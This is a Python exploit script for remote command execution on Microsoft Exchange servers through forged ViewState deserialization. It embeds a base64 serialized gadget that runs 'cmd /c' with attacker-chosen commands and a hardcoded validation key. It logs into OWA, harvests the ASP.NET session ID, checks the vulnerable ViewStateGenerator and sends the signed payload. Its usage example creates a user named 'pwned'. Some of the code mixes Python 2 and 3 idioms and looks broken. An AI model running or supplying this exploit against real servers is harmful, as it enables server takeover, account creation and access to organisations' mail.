#! /usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.request, urllib.error, urllib.parse
import urllib.request, urllib.parse, urllib.error
import base64
import binascii
import hashlib
import hmac
import struct
import argparse
import sys
import http.cookiejar
import ssl
import getpass

# STATIC STRINGS
# This string acts as a template for the serialization (contains "###payload###" to be replaced and TWO size locations)
strSerTemplate = base64.b64decode('/wEy2gYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD8BDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIiMjI3BheWxvYWQjIyMiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pgs=')
# This is a key installed in the Exchange Server, it is changeable, but often not (part of the vulnerability)
strSerKey = binascii.unhexlify(
    'CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF')


def convertInt(iInput, length):
    return struct.pack("<I", int(iInput)).encode('hex')[:length]


def getYsoserialPayload(sCommand, sSessionId):
    # PART1 of the payload to hash
    strPart1 = strSerTemplate.replace('###payload###', sCommand)
    # Fix the length fields
    # print(binascii.hexlify(strPart1[3]+strPart1[4])) ## 'da06' > '06da' (0x06b8 + len(sCommand))
    # print(binascii.hexlify(strPart1[224]+strPart1[225])) ## 'fc04' > '04fc' (0x04da + len(sCommand))
    strLength1 = convertInt(0x06b8 + len(sCommand), 4)
    strLength2 = convertInt(0x04da + len(sCommand), 4)
    strPart1 = strPart1[:3] + binascii.unhexlify(strLength1) + strPart1[5:]
    strPart1 = strPart1[:224] + binascii.unhexlify(strLength2) + strPart1[226:]

    # PART2 of the payload to hash
    strPart2 = '274e7bb9'
    for v in sSessionId:
        strPart2 += binascii.hexlify(v)+'00'
    strPart2 = binascii.unhexlify(strPart2)

    strMac = hmac.new(strSerKey, strPart1 + strPart2, hashlib.sha1).hexdigest()
    strResult = base64.b64encode(strPart1 + binascii.unhexlify(strMac))
    return strResult


def verifyLogin(sTarget, sUsername, sPassword, oOpener, oCookjar):
    if not sTarget[-1:] == '/':
        sTarget += '/'
    # Verify Login
    lPostData = {'destination': sTarget, 'flags': '4', 'forcedownlevel': '0',
                 'username': sUsername, 'password': sPassword, 'passwordText': '', 'isUtf8': '1'}
    try:
        sResult = oOpener.open(urllib.request.Request(
            sTarget + 'owa/auth.owa', data=urllib.parse.urlencode(lPostData), headers={'User-Agent': 'Python'})).read()
    except:
        print(('[!] Error, ' + sTarget + ' not reachable'))
    bLoggedIn = False
    for cookie in oCookjar:
        if cookie.name == 'cadata':
            bLoggedIn = True
    if not bLoggedIn:
        print('[-] Login Wrong, too bad')
        exit(1)
    print('[+] Login worked')

    # Verify Session ID
    sSessionId = ''
    sResult = oOpener.open(urllib.request.Request(
        sTarget+'ecp/default.aspx', headers={'User-Agent': 'Python'})).read()
    for cookie in oCookjar:
        if 'SessionId' in cookie.name:
            sSessionId = cookie.value
    print(('[+] Got ASP.NET Session ID: ' + sSessionId))

    # Verify OWA Version
    sVersion = ''
    try:
        sVersion = sResult.split('stylesheet')[0].split('href="')[
            1].split('/')[2]
    except:
        sVersion = 'favicon'
    if 'favicon' in sVersion:
        print('[*] Problem, this user has never logged in before (wizard detected)')
        print(('       Please log in manually first at ' +
              sTarget + 'ecp/default.aspx'))
        exit(1)
    print(('[+] Detected OWA version number '+sVersion))

    # Verify ViewStateValue
    sViewState = ''
    try:
        sViewState = sResult.split('__VIEWSTATEGENERATOR')[
            2].split('value="')[1].split('"')[0]
    except:
        pass
    if sViewState == 'B97B4E27':
        print('[+] Vulnerable View State "B97B4E27" detected, this host is vulnerable!')
    else:
        print(('[-] Error, viewstate wrong or not correctly parsed: '+sViewState))
        ans = input('[?] Still want to try the exploit? [y/N]: ')
        if ans == '' or ans.lower() == 'n':
            exit(1)
    return sSessionId, sTarget, sViewState


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t', '--target', help='Target IP or hostname (e.g. https://owa.contoso.com)', default='')
    parser.add_argument(
        '-u', '--username', help='Username (e.g. joe or joe@contoso.com)', default='')
    parser.add_argument(
        '-p', '--password', help='Password (leave empty to ask for it)', default='')
    parser.add_argument(
        '-c', '--command', help='Command to put behind "cmd /c " (e.g. net user pwned pwned /add)', default='')
    args = parser.parse_args()
    if args.target == '' or args.username == '' or args.command == '':
        print('[!] Example usage: ')
        print((
            ' ' + sys.argv[0] + ' -t https://owa.contoso.com -u joe -c "net user pwned pwned /add"'))
    else:
        if args.password == '':
            sPassword = getpass.getpass('[*] Please enter the password: ')
        else:
            sPassword = args.password
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        oCookjar = http.cookiejar.CookieJar()
        #oProxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'})
        #oOpener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),urllib2.HTTPCookieProcessor(oCookjar),oProxy)
        oOpener = urllib.request.build_opener(urllib.request.HTTPSHandler(
            context=ctx), urllib.request.HTTPCookieProcessor(oCookjar))
        sSessionId, sTarget, sViewState = verifyLogin(
            args.target, args.username, sPassword, oOpener, oCookjar)
        ans = input(
            '[+] All looks OK, ready to send exploit (' + args.command + ')? [Y/n]: ')
        if ans.lower() == 'n':
            exit(0)
        sPayLoad = getYsoserialPayload(args.command, sSessionId)
        print(('[+] Got Payload: ' + sPayLoad))
        sURL = sTarget + 'ecp/default.aspx?__VIEWSTATEGENERATOR=' + \
            sViewState + '&__VIEWSTATE=' + urllib.parse.quote_plus(sPayLoad)
        print('      Sending now ...')
        try:
            oOpener.open(urllib.request.Request(
                sURL, headers={'User-Agent': 'Python'}))
        except urllib.error.HTTPError as e:
            if e.code == '500':
                print('[+] This probably worked (Error Code 500 received)')


if __name__ == "__main__":
    main()
